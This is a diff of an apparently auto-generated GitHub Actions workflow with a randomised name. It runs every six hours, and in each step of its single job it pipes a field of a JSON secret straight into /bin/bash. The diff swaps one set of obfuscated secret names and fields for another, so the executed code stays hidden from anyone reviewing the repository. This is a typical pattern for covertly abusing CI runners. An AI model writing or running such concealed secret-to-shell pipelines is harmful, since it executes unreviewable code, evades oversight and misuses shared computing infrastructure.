@@ -3,32 +3,22 @@ name: yangguiziii
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-
-jobs:  # 13856
+    - cron: '23 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangguiziii
         env:
-          yjgcp30997: ${{ secrets.yjgcp30997 }}
+          vt81: ${{ secrets.vt81 }}
         run: |
-          echo $yjgcp30997 | jq -r .d88 | /bin/bash
-          echo $r2304 | jq -r .lknh8 | /bin/bash
-          echo $xf1084 | jq -r .wej62 | /bin/bash
-          echo $lhko10749 | jq -r .oulzo02 | /bin/bash
-          echo $jtx040 | jq -r .mcss83 | /bin/bash
-          echo $becev7 | jq -r .bot155 | /bin/bash
-          echo $tloo96 | jq -r .bcm0 | /bin/bash
-          echo $kxii1 | jq -r .bsgh61 | /bin/bash
-          echo $ctkr046 | jq -r .wola052 | /bin/bash
-          echo $h927 | jq -r .nj3 | /bin/bash
-          echo $hzez45 | jq -r .y9 | /bin/bash
-          echo $s7 | jq -r .t9 | /bin/bash
-          echo $h805 | jq -r .mjp8 | /bin/bash
-          echo $ys913 | jq -r .c228 | /bin/bash
-          echo $tne184 | jq -r .xz9740 | /bin/bash
-          echo $cxvvv7 | jq -r .hvhkx48 | /bin/bash
+          echo $vt81 | jq -r .fxwun391 | /bin/bash
+          echo $nf611 | jq -r .u67 | /bin/bash
+          echo $czq5 | jq -r .h5 | /bin/bash
+          echo $jtqb0036 | jq -r .bjil086 | /bin/bash
+          echo $oytm5543 | jq -r .k7 | /bin/bash
+          echo $lc82 | jq -r .vwgg41 | /bin/bash
+          echo $dkzk6 | jq -r .ja25053 | /bin/bash
+          echo $uy45 | jq -r .p2 | /bin/bash
 
